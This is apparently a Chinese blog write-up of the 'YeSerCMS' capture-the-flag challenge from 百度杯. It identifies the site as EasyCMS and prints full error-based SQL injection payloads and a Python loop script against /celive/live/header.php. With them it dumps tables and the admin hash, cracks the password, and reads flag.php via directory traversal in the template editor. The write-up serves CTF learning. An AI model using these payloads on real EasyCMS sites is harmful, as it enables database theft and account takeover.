---
title: 百度杯 YeSerCMS
date: 2020-05-31 16:50:55
updated: 2020-05-31 16:50:55
categories: Write up
---



hint：新的CMS系统，帮忙测测是否有漏洞。
​           tips:flag在网站根目录下的flag.php中   <!--more-->

# CMS

内容管理系统（通常缩写为CMS）是帮助用户在网站上创建，管理和修改内容而无需专业技术知识的软件。内容管理系统作为一种工具，可以帮助构建网站，而无需从头开始编写所有代码

## 常见判断网站cms方法

> 1   .robots.txt文件  
> 2   .通过版权信息进行查询 (比如网站底部版权信息)
> 3  .通过查看网页源码的方式
> 4  .CMS扫描器
> 5  .cms指纹识别

cms会存在漏洞，百度搜索本题的YeSerCMS没有结果，猜测改名了

在本题中通过逛网站`文档下载`一栏，随便点个文档进行下载，在网页底部的`我要评论`处可看到为`EasyCMS`

> EasyCMS是一套使用PHP语言编写的、可扩展的轻量级开源内容管理系统（CMS）。
> EasyCMS 1.5版本中的App/Modules/Admin/Tpl/default/Public/dwz/uploadify/scripts/uploadify.swf文件存在跨站脚本漏洞。远程攻击者可借助‘uploadifyID’或‘movieName’参数利用该漏洞注入任意的
> Web脚本或HTML。

百度搜下easycms的漏洞，本题可利用<a href='https://www.cnblogs.com/yangxiaodi/p/6963624.html' target="_blank">无限制报错注入</a>进行

爆数据库：

```
url: /celive/live/header.php
post：

xajax=Postdata&xajaxargs[0]=<xjxquery><q>detail=xxxxxx',(UpdateXML(1,CONCAT(0x5b,mid((SELECT/**/GROUP_CONCAT(table_name) from information_schema.tables where table_schema=database()),1,32),0x5d),1)),NULL,NULL,NULL,NULL,NULL,NULL)-- </q></xjxquery>

```

爆表：

```
xajax=Postdata&xajaxargs[0]=<xjxquery><q>detail=xxxxxx',(UpdateXML(1,CONCAT(0x5b,mid((SELECT/**/GROUP_CONCAT(table_name) from information_schema.tables where table_schema=database()),1,32),0x5d),1)),NULL,NULL,NULL,NULL,NULL,NULL)-- </q></xjxquery>
```

这里可以看到返回的数据是`XPATH syntax error: '[yesercms_a_attachment,yesercms_'`

很明显表没有全部列出来，这里可以修改参数`1`或者py脚本解决

py脚本如下：

```
import requests
url= 'http://340d45344c5345b7837232f683eac21005849e95f56547e6.changame.ichunqiu.com/celive/live/header.php'
for i in range(1,999,31):     #这里的意思是从1开始，隔31各后再取，即i的第二个值为32，至于这里为什么是32，从Post和响应数据可以看出来
    postdata = {'xajax': 'Postdata', 'xajaxargs[0]': "<xjxquery><q>detail=xxxxxx',(UpdateXML(1,CONCAT(0x5b,mid((SELECT/**/GROUP_CONCAT(table_name) from information_schema.tables where table_schema=database()),%s,32),0x5d),1)),NULL,NULL,NULL,NULL,NULL,NULL)-- </q></xjxquery>" %str(i)}
    r = requests.post(url,data=postdata)
    print(r.content[22:53])

```

有个yesercms_user表，尝试从这个表爆字段：

```
xajax=Postdata&xajaxargs[0]=<xjxquery><q>detail=xxxxxx',(UpdateXML(1,CONCAT(0x5b,mid((SELECT/**/GROUP_CONCAT(concat(username,'|',password)) from yesercms_user),1,32),0x5d),1)),NULL,NULL,NULL,NULL,NULL,NULL)-- </q></xjxquery>

```

得到[admin|ff512d4240cbbdeafada40467

猜测密码为MD5加密，但是位数不够，将1，32 改为 33，64

```
xajax=Postdata&xajaxargs[0]=<xjxquery><q>detail=xxxxxx',(UpdateXML(1,CONCAT(0x5b,mid((SELECT/**/GROUP_CONCAT(concat(username,'|',password)) from yesercms_user),33,64),0x5d),1)),NULL,NULL,NULL,NULL,NULL,NULL)-- </q></xjxquery>

```

得到ccbe61

拼接md5解密得Yeser231

因此账号为admin,密码为Yeser231



然后下一步就是重点了，怎么得到flag.php中的内容

我们可以进入模板一栏的当前模板编辑，对服务器文件进行编辑

因此使用burpsuite抓编辑的包，尝试修改id参数来读取flag.php，这里不清楚flag.php在几级目录可以依次尝试flag.php,../flag.php,../../flag.php，在../../flag.php时成功拿到flag